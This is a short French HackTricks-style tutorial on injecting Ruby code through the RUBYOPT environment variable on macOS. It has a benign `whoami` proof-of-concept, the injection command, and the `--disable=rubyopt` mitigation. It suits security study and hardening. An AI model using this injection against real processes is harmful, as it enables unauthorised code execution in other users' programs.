# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby analyse les options de ligne de commande prises en charge depuis la variable d’environnement `RUBYOPT` avant d’exécuter un script. Bien que Ruby rejette certaines options à cet endroit, `-I` peut ajouter un répertoire de recherche de bibliothèques et `-r` peut charger une bibliothèque. Un processus qui lance Ruby avec des variables d’environnement contrôlées par un attaquant peut donc être amené à charger du code Ruby contrôlé par l’attaquant.<sup>[[1]](#references)</sup>

Créez `/tmp/inject.rb` :
```ruby:inject.rb
puts `whoami`
```
Créez un script Ruby inoffensif tel que `hello.rb` :
```ruby:hello.rb
puts 'Hello, World!'
```
Exécutez-le avec une valeur contrôlée de `RUBYOPT` :
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Pour désactiver ce comportement, passez `--disable=rubyopt` (ou `--disable-rubyopt`) **avant** le nom du script :<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Une option écrite après `hello.rb` est transmise au script dans `ARGV` ; elle ne désactive pas le traitement préalable de `RUBYOPT` par Ruby.<sup>[[1]](#references)</sup>

## References

- [1] [Documentation Ruby - Options de ligne de commande Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
